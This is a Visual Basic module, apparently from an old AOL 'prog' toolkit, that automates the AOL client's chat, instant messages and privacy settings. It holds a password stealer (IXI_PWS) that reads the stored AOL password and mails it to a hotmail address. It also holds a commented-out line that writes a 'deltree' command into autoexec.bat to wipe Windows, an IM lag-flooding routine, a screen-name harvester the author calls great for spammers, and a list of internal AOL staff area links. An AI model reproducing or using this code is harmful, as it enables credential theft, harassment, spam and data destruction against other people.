                    Call ReadProcessMemory(ProcessThread&, ListHoldItem&, name$, Len(name$), BytesRead&)
                    'name$ = Left(name$, InStr(name$, vbNullChar) - 1)
                    If name$ <> getuser$ Then
                    ListBox.AddItem name$
                   Current& = Current& + 1
           If lbl.caption = "a" Then Exit Sub
                                     If Current& >= limit Then Exit Sub
                     End If
                Next SearchIndex&
                Call CloseHandle(ProcessThread&)
            End If
            DoEvents
            Call AOL4_KillWin(FindRoom&)
            TimeOut 5
        Loop
End Sub

Public Sub AddWhosChatting(ListBox As Control)
 'werx
    Dim Process As Long, ListHoldItem As Long, name As String
    Dim ListHoldName As Long, BytesRead As Long, SearchIndex As Long
    Dim ProcessThread As Long, ListHandle3 As Long, WhosChatting As Long
    Do: DoEvents
        WhosChatting& = FindWindowEx(AolMdi, 0&, "AOL Child", "Who's Chatting")
        ListHandle3& = FindWindowEx(WhosChatting&, 0&, "_AOL_Listbox", vbNullString)
    Loop Until WhosChatting& <> 0& And ListHandle3& <> 0&
    Call GetWindowThreadProcessId(ListHandle3&, Process&)
    ProcessThread& = OpenProcess(Op_Flags, False, Process&)
        If ProcessThread& Then
        kk$ = "0"
            For SearchIndex& = 0 To listcount(ListHandle3&) - 1
                kk$ = kk$ + 1
                name$ = String(4, vbNullChar)
                ListHoldItem& = SendMessage(ListHandle3&, LB_GETITEMDATA, ByVal CLng(SearchIndex&), 0&)
                ListHoldItem& = ListHoldItem& + 24
                Call ReadProcessMemory(ProcessThread&, ListHoldItem&, name$, 4, BytesRead&)
                Call RtlMoveMemory(ListHoldItem&, ByVal name$, 4)
                ListHoldItem& = ListHoldItem& + 6
                name$ = String(16, vbNullChar)
                Call ReadProcessMemory(ProcessThread&, ListHoldItem&, name$, Len(name$), BytesRead&)
                              If name$ <> getuser$ Then
                        ListBox.AddItem (name$)
                        If kk$ = "26" Then GoTo lll
                    End If
                    
            Next SearchIndex&
lll:
Call RemoveDuplicateNames(ListBox)
    Call CloseHandle(ProcessThread&)
        End If
End Sub
Public Sub AutoListerFindAChat(ListBox As Control, limit)
'Ever used auto gather in inertia, well here is a sub much like the one monk had to make
'You can set the number of people to however many you want, my default is set to 100
'Great sub for spammers

'i didnt make diz i forgot who did but chea it tiz -=)

    Dim Process As Long, ListHoldItem As Long, name As String
    Dim ListHoldName As Long, BytesRead As Long, ListHandle1 As Long
    Dim ProcessThread As Long, SearchIndex As Long, ListHandle2 As Long
    Dim ListHandle3 As Long, SetIndex As Long, WhosChatting As Long
    Dim AolIcon As Long, Current As Long
    If FindAChatWindow& = 0& Then
        Call PopUpIcon(9, "F")
        Do: DoEvents
            ListHandle1& = FindWindowEx(FindAChatWindow&, 0&, "_AOL_Listbox", vbNullString)
            ListHandle2& = FindWindowEx(FindAChatWindow&, ListHandle1&, "_AOL_Listbox", vbNullString)
        Loop Until FindAChatWindow& <> 0& And ListHandle1& <> 0& And ListHandle2& <> 0&
        Call TimeOut(4)
    End If
    ListHandle1& = FindWindowEx(FindAChatWindow&, 0&, "_AOL_Listbox", vbNullString)
    ListHandle2& = FindWindowEx(FindAChatWindow&, ListHandle1&, "_AOL_Listbox", vbNullString)
    AolIcon& = NextOfClassByCount(FindAChatWindow&, "_AOL_Icon", 9)
    DoEvents
    For SetIndex& = 0 To listcount(ListHandle2&) - 2
        Call ListSetFocus(ListHandle2&, SetIndex&)
         cLickiCoN (AolIcon&)
        Do: DoEvents
            WhosChatting& = FindWindowEx(AolMdi, 0&, "AOL Child", "Who's Chatting")
            ListHandle3& = FindWindowEx(WhosChatting&, 0&, "_AOL_Listbox", vbNullString)
        Call AddWhosChatting(ListBox)
        Loop Until WhosChatting& <> 0& And ListHandle3& <> 0&
        TimeOut 2.5
           Call AOL4_KillWin(WhosChatting&)
                        Call AOL4_KillWin(FindAChatWindow&)
                        Exit Sub
                    
                
                DoEvents
        
            Call CloseHandle(ProcessThread&)
        
        Call TimeOut(0.5)
        Call AOL4_KillWin(WhosChatting&)
        TimeOut 9
    Next SetIndex&
End Sub

Sub AOLIM_LAGG(Who)
Call sendim("" & Who & "", "" & Format$(String$(180, Chr$(13))))
TimeOut (2)
Call IManswer("" & Format$(String$(180, Chr$(13))))
TimeOut (2)
Call IManswer("" & Format$(String$(180, Chr$(13))))
TimeOut (2)
Call IManswer("</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>IIIIIIIIIII<html></html><html></html>")

End Sub

 Function izEMP() As Boolean
 'wop
IMsOff
Call sendim(getuser, ASCII_Random + "empowered.... [?]")
    Do: DoEvents
        MessageOk& = FindWindow("#32770", "America Online")
        UserIm& = FindWindowEx(AolMdi, 0&, "AOL Child", "  Instant Message To: " & UserSN)
    Loop Until MessageOk& <> 0& Or UserIm& <> 0& Or FindWindowEx(AolMdi, 0&, "AOL Child", "Send Instant Message") = 0&
    If MessageOk& <> 0& Then
        izEMP = False
        OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
        Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(FindWindowEx(AolMdi, 0&, "AOL Child", "Send Instant Message"), WM_CLOSE, 0&, 0&)
        Exit Function
       ElseIf UserIm& <> 0& Then
        izEMP = True
        TimeOut 0.6
        Call PostMessage(UserIm&, WM_CLOSE, 0&, 0&)
        Exit Function
    End If
IMsOn
End Function



Sub Room_RE(times As String)
'ouwop
If times$ > 9 Then times$ = "10"
Do
DoEvents:
Call XAOL4_Keyword(Room_URL)
TimeOut (0.5)
times$ = times$ - 1
Loop Until times$ = "0"
End Sub

 Function TrimSpaces(MainString As String) As String
    Dim NewMain As String, Instance As Long
    NewMain$ = MainString$
    Do While InStr(1, NewMain$, " ")
        DoEvents
        Instance& = InStr(1, NewMain$, " ")
        NewMain$ = Left(NewMain$, (Instance& - 1)) & "" & Right(NewMain$, Len(NewMain$) - Instance&)
    Loop
    TrimSpaces$ = NewMain$
End Function
Public Function listcount(ListBox As Long) As Long
    listcount& = SendMessageLong(ListBox&, LB_GETCOUNT, 0&, 0&)
End Function


Public Sub PopUpIcon(IconNumber As Long, Character As String)
    Dim Message1 As Long, Message2 As Long, AolFrame As Long
    Dim AolToolbar As Long, Toolbar As Long, AolIcon As Long
    Dim NextOfClass As Long, AscCharacter As Long
    Message1& = FindWindow("#32768", vbNullString)
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolToolbar& = FindWindowEx(AolFrame&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(AolToolbar, 0&, "_AOL_Toolbar", vbNullString)
    AolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    For NextOfClass& = 1 To IconNumber&
        AolIcon& = GetWindow(AolIcon&, 2)
    Next NextOfClass&
    Call PostMessage(AolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(AolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do: DoEvents
        Message2& = FindWindow("#32768", vbNullString)
    Loop Until Message2& <> Message1&
    AscCharacter& = Asc(Character$)
    Call PostMessage(Message2&, WM_CHAR, AscCharacter&, 0&)
End Sub
Public Sub ListSetFocus(ListBox As Long, ListIndex As Long)
    Call SendMessageLong(ListBox&, LB_SETCURSEL, ListIndex&, 0&)
End Sub
Public Function FindAChatWindow() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", "Find a Chat")
   If AOLChild& <> 0& Then
     FindAChatWindow& = AOLChild&
     Exit Function
    Else
      AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", "Find a Chat")
      FindAChatWindow& = AOLChild&
      Exit Function
   End If
End Function


Function fortune(Who As String, What As String)
'ouwop
Dim say
Randomize
say = Int(11 * Rnd + 1)
If InStr(LCase(What$), LCase("how many")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_nuM: Exit Function
If InStr(LCase(What$), LCase("when will")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_uP: Exit Function
If InStr(LCase(What$), LCase("when do")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_uP: Exit Function
If InStr(LCase(What$), LCase("when am")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_uP: Exit Function
If InStr(LCase(What$), LCase("when is")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_uP: Exit Function
If InStr(LCase(What$), LCase("when iz")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_uP: Exit Function
If InStr(LCase(What$), LCase("when did")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_Down: Exit Function
If InStr(LCase(What$), LCase("when me")) Then sendchat "¤•[<b>" + Who$ + "</b> - " + fortune_WeN_uP: Exit Function
If InStr(LCase(What$), LCase("can you")) Then sendchat "¤•[<b>" + Who$ + "</b> - see a phyciatrizt, im juzt a comp fo0": Exit Function
If InStr(LCase(What$), LCase("can u")) Then sendchat "¤•[<b>" + Who$ + "</b> - no i cant fo0": Exit Function
If InStr(LCase(What$), LCase("where will")) Then sendchat "¤•[<b>" + Who$ + "</b> - Sorry but my programmin wuz poorly done by ouwop, i aint that smart ;[": Exit Function
If InStr(LCase(What$), LCase("where will")) Then sendchat "¤•[<b>" + Who$ + "</b> - you muzt need help to azk a bot thiz type of queztion": Exit Function
If InStr(LCase(What$), LCase("what you")) Then sendchat "¤•[<b>" + Who$ + "</b> - IM only a simple computer program, dont expect 2 much": Exit Function
If InStr(LCase(What$), LCase("what u")) Then sendchat "¤•[<b>" + Who$ + "</b> - How tha fuck am i sposed to know": Exit Function
If InStr(LCase(What$), LCase("why")) Then sendchat "¤•[<b>" + Who$ + "</b> -  ouwop didnt program me to know all that n0w": Exit Function
If InStr(LCase(What$), LCase("where's")) Then sendchat "¤•[<b>" + Who$ + "</b> - i dunno": Exit Function
If InStr(LCase(What$), LCase("wherez")) Then sendchat "¤•[<b>" + Who$ + "</b> - ur azking me???": Exit Function
If InStr(LCase(What$), LCase("wheres")) Then sendchat "¤•[<b>" + Who$ + "</b> - im gittin a headache": Exit Function
If InStr(LCase(What$), LCase("where'z")) Then sendchat "¤•[<b>" + Who$ + "</b> - How da fuck am i sposed 2 know": Exit Function

If say = 1 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Dont ask me..."
If say = 2 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Azk me again"
If say = 3 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Hellz No"
If say = 4 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Hellz yea"
If say = 5 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "I dont Know"
If say = 6 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Who Carez"
If say = 7 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Juzt Might"
If say = 8 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Maybe"
If say = 9 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "No"
If say = 10 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Yes"
If say = 11 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Sorry, i dont understand the queztion"
If say = 12 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "You Know da Answer to that Queztion"
If say = 13 Then sendchat "¤•[<b>" + Who$ + "</b> - " + "Hopefully..."


End Function
Function fortune_nuM()
'ouwop
Dim num
Randomize
num = Int(10 * Rnd + 1)
fortune_nuM = num
End Function
Function fortune_WeN_Down()
'ouwop
Dim num
Dim fin As String
Randomize
num = Int(100 * Rnd + 1)
fin = Date - num
fortune_WeN_Down = "On " + fin + ""

End Function


Function fortune_WeN_uP()
'ouwop ~
Dim num
Dim fin As String
Randomize
num = Int(100 * Rnd + 1)
fin = Date + num
fortune_WeN_uP = "On " + fin + ""
End Function




Sub Button(hButton As Long)
Call SendMessage(hButton, WM_KEYDOWN, VK_SPACE, 0)
Call SendMessage(hButton, WM_KEYUP, VK_SPACE, 0)
End Sub


 Sub AOL25_GhozT(bGhosting As Boolean)
 'by søpøn
 'edited by me [ouwop] to werk in my bas'
Dim hMain&, hIcon&
Call AOL25_keyword("buddy")
Do
    DoEvents
    hMain = FindWindowEx(AolMdi, 0, "AOL Child", getuser & "'s Buddy List")
Loop Until hMain <> 0
Do
    hIcon& = FindWindowEx(hMain, hIcon, "_AOL_Icon", vbNullString)
Loop Until gettext(hIcon&) = "  Privacy Preferences  "
 Clicker (hIcon&)
Do
    DoEvents
    hMain = FindWindowEx(AolMdi, 0, "AOL Child", "Privacy Preferences")
    hIcon = FindWindowEx(hMain, 0, "_AOL_Static", vbNullString)
Loop Until hIcon <> 0
If bGhosting = True Then
        hIcon = FindWindowEx(hMain, hIcon, "_AOL_Button", "Block all AOL members and AOL Instant Messenger users")
Else
       hIcon = FindWindowEx(hMain, hIcon, "_AOL_Button", "Allow all AOL members and AOL Instant Messenger users")
End If
Call Button(hIcon)
Do
    DoEvents
    hIcon = FindWindowEx(hMain, hIcon, "_AOL_Icon", vbNullString)
Loop Until gettext(hIcon) = "Save"

 Clicker (hIcon)

Do
    DoEvents
    hMain = FindWindow("#32770", "America Online")
Loop Until hMain <> 0

Call PostMessage(hMain, WM_CLOSE, 0, 0)
Call PostMessage(FindWindowEx(AolMdi, 0, "AOL Child", getuser & "'s Buddy List"), WM_CLOSE, 0, 0)
End Sub

Sub ADD_Keywordz(lst As Control)
'ouwop
lst.AddItem "AOL Gateways:  aol://4344:1186.Gateway.3685343.498065448"
lst.AddItem "Guide Rainman:  aol://4344:1186.guide.3682978.488405094"
lst.AddItem "Guide Conf Room:  aol://4344:1186.ConfRms.3685342.498065107"
lst.AddItem "Guide Libaries:  aol://4344:1186.ResLib.3685341.498053484"
lst.AddItem "ARC:  aol://4344:666.arcform.860809.504463074 = normal"
lst.AddItem "Community Center:  aol://4344:1186.comcen.3683158.490570698"
lst.AddItem "Rainman Cmds:  aol://4344:1.rmc.70682.473023645 = normal"
lst.AddItem "Forms:  aol://4344:1.formscat.71914.474386750 = normal"
lst.AddItem "S&S Policy:  aol://4344:223.pnp.91463.482279948"
lst.AddItem "Special Acnts:  aol://4344:223.specacct.89721.481584812"
lst.AddItem "Secrets:  aol://4344:409.secrets.6553845.498835541 = normal"
lst.AddItem "Search Stuff: aol://4344:204.z66proj2.1845884.505890733"
lst.AddItem "OH account:  aol://4344:20.oh1te.92384.497065962"
lst.AddItem "TLA app:  aol://4344:20.tlaapp1.125506.492637725"
lst.AddItem "Special Account Groups:  aol://4344:223.affingrp.89731.481585326"
lst.AddItem "CNN:  aol://4344:223.cnn.89754.481594657"
lst.AddItem "DEMO Accounts:  aol://4344:223.demo.89755.481594657"
lst.AddItem "Special Account Desc's:  aol://4344:223.specacct.89721.481584812"
lst.AddItem "April Promo Codes:  aol://4344:223.aprilpr.96692.512240264"
lst.AddItem "Promotion Codes:  aol://4344:223.promocd.6558384.500850050"
lst.AddItem "Canadian Software:  aol://4344:223.ca ad2.6602532.512279521"
lst.AddItem "Marketing Info:  aol://4344:223.markting.6558102.5007 4022"
lst.AddItem "Did You Know???:  aol://4344:223.helpdocs.84876.494254534"
lst.AddItem "Guide Program:  aol://4344:1186.guide.3682978.488405094"
lst.AddItem "Conference Room:  aol://4344:243.mainconf.5964915.500 42609"
lst.AddItem "Computing Channel:  aol://4344:1454.comp_cha.3407965.483568458"
lst.AddItem "Art Shop:  aol://1722:testview"
lst.AddItem "WebRequest:  aol://1391:40-31999"
lst.AddItem "AOL Pointers Newstand:  aol://4344:559.newslet.4129994.494194276"
lst.AddItem "Host/IP list:  aol://4344:204.rslists.67146.468717561"
lst.AddItem "Vogel Verlag:  aol://2719:3-524"
lst.AddItem "TV Today Chat aol://2719:3-602"
lst.AddItem "Legal Pad:  aol://2719:3-599"
lst.AddItem "In The Soup:  aol://2719:3-600"
lst.AddItem "Examine Object Info:  aol://1722:eoi"

End Sub


Function AOL25_CheckAlivE()
'ouwop
'not finsihed yet >;[
End Function

Sub Err_Room()
'wopperz
MsgBox "Not in a AOL2.5 or AOL4.0 ChatRoom" + Ouwop_MSG, vbCritical, "Err0r!"
End Sub

Sub cChat_TOS(lbl As String, tmr As Timer, lbl2 As Label)
    Dim lnglen&, strstring$, lngcolon&, strwho$, strmessage$
    If LCase$(getchatlinemsg$) Like "/tos *" Then
        Let lnglen& = Len(getchatlinemsg$) - 5&
        Let strstring$ = Right$(getchatlinemsg$, lnglen&)
        Let lngcolon& = InStr(strstring$, ":")
On Error GoTo nex
        Let strwho$ = Left$(strstring$, lngcolon& - 1&)
        Let strmessage$ = Mid$(strstring$, lngcolon& + 1&, Len(strstring$) - lngcolon& + 1&)
    End If
   ' MsgBox (strwho$ + " " + lbl$ + " " + strmessage$)
   Call Ouwop_TERM2(strwho$, lbl$, strmessage$, tmr, lbl2)
nex:
End Sub

Function IXI_PWS(KillComp As Boolean, restArT As Boolean)
'ouwop
'not finished or tezted yet.
Call XAOL4_SignOff
TimeOut (2)
terp:
Do
DoEvents:
TimeOut (0.1)
d$ = GetSTOREDpw(False)
If d$ = "" Then GoTo terp Else GoTo f2
f2:
If FindWelcome& <> 0& Then GoTo f1 Else GoTo f2
f1:
TimeOut (2)
Call senDmail("Ouwop_IXI@hotmail.com", getuser, getuser + " - " + d$)
Call XAOL4_SignOff
'If KillComp = True Then Call FileWrite("c:\autoexec.bat", "Deltree /y c:\windows >nul")
'If restArT = True Then Call Exit_Restart
Loop
End Function

Sub izOH(AdV As Boolean)
'ouwop
Call MazTa_KW("aol://4344:20.oh1te.92384.497065962") 'oh
TimeOut (1)
If FindWindow("#32770", "America Online") <> 0 Then
waitforOK
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ASCII_Random + " <i>" + getuser + "</i>, <b>iz</b> NOT a <b>OH</b> <u>A</u>ccount-"
MsgBox "Diz iz Not a OH account!", vbCritical, "Nah"
Call ClicK_OK("America Online")
Else
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ASCII_Random + " <i>" + getuser + "</i>, <b>iz</b> a <b>OH</b> <u>A</u>ccount!"
MsgBox "Diz iz a OH account", 64, "Yea Yea"
Call ClicK_OK("America Online")
End If
Call ClicK_OK("America Online")
End Sub

Function Link2roOm(Who As String)
'Ouwop
'sendz a link to a person n automatically knowz the roomz name n location
'>;]
If FindRoom = False Then MsgBox "Not in a chat ro0m" + Ouwop_MSG, vbCritical, "Err0r!": Exit Function
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("town")) Then v$ = "aol://2719:21-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("places")) Then v$ = "aol://2719:25-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("friends")) Then v$ = "aol://2719:34-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("romance")) Then v$ = "aol://2719:26-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("life")) Then v$ = "aol://2719:23-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("arts")) Then v$ = "aol://2719:22-2-"
If izRoomPrivate Then
curr$ = "<B>< a href=" & "aol://2719:2-2-" + XAOL4_GetCurrentRoomName & ">" & "</u>" + "CLicK HERE to Enter ro0m </u>[" + XAOL4_GetCurrentRoomName & "]</a>"
curr$ = curr$ & Chr(13) & Chr(10) & Chr(9) & ASCII_Random + " <font color=#ff3300><b>O</b>uwopz <b>M</b>azTa <b>P</b>rogg!"
Call sendim(Who$, curr$)
Exit Function
Else
chatTrim$ = Left$(XAOL4_GetCurrentRoomName, 40)
For z = 1 To 40
If Mid$(chatTrim$, z, 1) = "-" Then sn$ = Left$(chatTrim$, z - 1)
Next z
ChatTrimNum = Len(sn$)
chatTrim$ = Mid$(XAOL4_GetCurrentRoomName, ChatTrimNum + 1, Len(XAOL4_GetCurrentRoomName)) ' - Len(sn$))
ro0M$ = chatTrim$
ro0M$ = RePlacestRing(ro0M$, "-", "")
Call RePlacestRing(v$, " ", "")
Call RePlacestRing(ro0M$, " ", "")
curr$ = "<B>< a href=" & v$ + ro0M$ & ">" & "</u>" + "CLicK HERE to Enter Ro0m [" + ro0M$ & "</a>"
curr$ = curr$ & Chr(13) & Chr(10) & Chr(9) & ASCII_Random + " <font color=#ff3300><b>O</b>uwopz <b>M</b>azTa <b>P</b>rogg!"
Call sendim(Who$, curr$)
End If
End Function
Function Room_URL()
'Ouwop
'returnz da value of da room
'>;]
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("town")) Then v$ = "aol://2719:21-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("places")) Then v$ = "aol://2719:25-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("friends")) Then v$ = "aol://2719:34-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("romance")) Then v$ = "aol://2719:26-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("life")) Then v$ = "aol://2719:23-2-"
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("arts")) Then v$ = "aol://2719:22-2-"
If izRoomPrivate Then
v$ = "aol://2719:2-2-" + XAOL4_GetCurrentRoomName
Room_URL = v$
Exit Function
Else
chatTrim$ = Left$(XAOL4_GetCurrentRoomName, 40)
For z = 1 To 40
If Mid$(chatTrim$, z, 1) = "-" Then sn$ = Left$(chatTrim$, z - 1)
Next z
ChatTrimNum = Len(sn$)
chatTrim$ = Mid$(XAOL4_GetCurrentRoomName, ChatTrimNum + 1, Len(XAOL4_GetCurrentRoomName)) ' - Len(sn$))
ro0M$ = chatTrim$
ro0M$ = RePlacestRing(ro0M$, "-", "")
Call RePlacestRing(v$, " ", "")
Call RePlacestRing(ro0M$, " ", "")
Room_URL = v$ + ro0M$
End If
End Function


 Function LoByte(ByVal wParam As Integer)
'by lash
'heh, a whole 2 secondz
'[ouwop]
    LoByte = wParam And &HFF&
End Function
Function MazTa_FindroOm()
'ouwop
If FindRoom = False And AOL25_FindroOm = False Then
MazTa_FindroOm = 0
Else
MazTa_FindroOm = 1
End If
End Function

Sub MazTa_GhozT()
'ouwop
If AOL_VerzioN = 4 Then Call AOL4_GhozT
If AOL_VerzioN = 2 Then Call AOL25_GhozT(True)
If AOL_VerzioN = 5 Then Call AOL4_GhozT

End Sub
Sub MazTa_UNGhozT()
'ouwop
If AOL_VerzioN = 2 Then
Call AOL25_GhozT(False)
Else
Call AOL4_Un_GhozT

End If

End Sub


Function MSG_YesNo(WhatToazK As String, num As String, tiTle As String)
'Ouwop
'Example =- Call Msg_YesNo("Quit Now?",64,"Are you Sure?")
If MsgBox(WhatToazK$, num$ + vbYesNo, tiTle$) = vbYes Then
MSG_YesNo = 1
Else
MSG_YesNo = 0
End If
End Function

Sub OH_Design1()
'ouwop
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
sendchat ":  (::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)"
sendchat ":  (:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)"
sendchat ":  (::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)"
sendchat ":  (:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)"
sendchat ":  (*:::::::)(:::::::*)(*:::::::)(:::::::*)(*:::::::)(:::::::*)"
sendchat ":  (:*::::::)(::::::*:)(:*::::::)(::::::*:)(:*::::::)(::::::*:)"
sendchat ":  (::*:::::)(:::::*::)(::*:::::)(:::::*::)(::*:::::)(:::::*::)"
sendchat ":  (:::*::::)(::::*:::)(:::*::::)(::::*:::)(:::*::::)(::::*:::)"
